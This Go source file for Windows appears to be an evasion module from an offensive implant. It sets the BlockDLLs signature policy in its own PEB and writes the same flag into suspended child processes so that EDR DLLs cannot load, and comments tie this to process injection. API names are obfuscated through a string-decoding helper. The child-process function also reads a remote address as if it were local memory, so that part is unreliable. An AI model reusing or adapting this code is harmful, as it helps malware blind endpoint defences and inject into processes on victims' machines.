//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32Block = syscall.NewLazyDLL("kernel32.dll")
)

func blockDLLs() string {
	if !pebBlockDLLs {
		return "PEB BlockDLLs: disabled by EDR strategy"
	}
	results := ""

	// Method 1: Set ProcessSignaturePolicy (imported from kernel32.dll, NOT ntdll)
	procSetProcessMitigationPolicy := kernel32Block.NewProc(s(SProcMitPolicy))

	const ProcessSignaturePolicy uint32 = 8
	type processMitigationSignaturePolicy struct {
		Flags uint32
	}
	var policy processMitigationSignaturePolicy
	policy.Flags = 1

	ret, _, err := procSetProcessMitigationPolicy.Call(
		uintptr(ProcessSignaturePolicy),
		uintptr(unsafe.Pointer(&policy)),
		uintptr(unsafe.Sizeof(policy)),
	)
	if ret == 0 {
		results += fmt.Sprintf("SetProcessMitigationPolicy failed: %v\n", err)
	} else {
		results += "ProcessSignaturePolicy enabled\n"
	}

	// Method 2: PEB approach
	results += "PEB BlockDlls: " + blockDllsPEBInternal()
	return results
}

func blockDLLsPEB() string {
	return "PEB BlockDlls: " + blockDllsPEBInternal()
}

func blockDllsPEBInternal() string {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess := ntdll.NewProc(s(SProcNtQIP))

	type processBasicInformation struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uintptr
		UniqueProcessID              uintptr
		InheritedFromUniqueProcessID uintptr
	}

	var pbi processBasicInformation
	ret, _, _ := procNtQueryInformationProcess.Call(
		^uintptr(0),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		0,
	)
	if ret != 0 {
		return fmt.Sprintf("NtQueryInformationProcess failed: 0x%x", ret)
	}

	// PEB->ProcessParameters->Flags offset varies by Windows version
	// Typically at PEB+0x20 (64-bit) for ProcessParameters pointer
	ppOffset := uintptr(0x20)
	if pbi.PebBaseAddress == 0 {
		return "PEB address is nil"
	}

	// PEB offset 0x20: ProcessParameters pointer (PEB64 layout)
	ppPtr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + ppOffset))
	if ppPtr == 0 {
		return "ProcessParameters is nil"
	}

	// Flags field is at offset 0x70 (Win10) or 0x74 (Win11) in RTL_USER_PROCESS_PARAMETERS
	// Set bit 0x20 (BlockDlls) to enable non-Microsoft DLL blocking
	flagsOffset := uintptr(0x70)
	// RTL_USER_PROCESS_PARAMETERS offset 0x70: Flags field (Win10+)
	flags := *(*uint32)(unsafe.Pointer(ppPtr + flagsOffset))
	flags |= 0x20
	// Set PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	*(*uint32)(unsafe.Pointer(ppPtr + flagsOffset)) = flags
	return fmt.Sprintf("PEB BlockDlls flag set (old flags: 0x%x)", flags)
}

// applyBlockDLLsToChild propagates the BlockDLLs PEB flag into a freshly spawned,
// still-suspended child process so non-Microsoft DLLs are blocked when it loads
// its modules. It mirrors blockDllsPEBInternal but operates on the remote child
// handle (hProc) via WriteProcessMemory. Best-effort: any failure is silently
// ignored so injection is never blocked by a failed hardening step.
func applyBlockDLLsToChild(hProc uintptr) {
	if !pebBlockDLLs || hProc == 0 {
		return
	}
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtQIP := ntdll.NewProc(s(SProcNtQIP))

	type processBasicInformation struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uintptr
		UniqueProcessID              uintptr
		InheritedFromUniqueProcessID uintptr
	}
	var pbi processBasicInformation
	ret, _, _ := procNtQIP.Call(
		hProc,
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		0,
	)
	if ret != 0 || pbi.PebBaseAddress == 0 {
		return
	}
	// PEB+0x20: ProcessParameters pointer (PEB64 layout)
	ppPtr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
	if ppPtr == 0 {
		return
	}
	// RTL_USER_PROCESS_PARAMETERS+0x70: Flags field (Win10+); bit 0x20 = BlockDlls
	flagsPtr := ppPtr + 0x70
	var flags uint32 = 0x20
	procWrite := kernel32Block.NewProc("WriteProcessMemory")
	procWrite.Call(hProc, flagsPtr, uintptr(unsafe.Pointer(&flags)), uintptr(unsafe.Sizeof(flags)), 0)
}
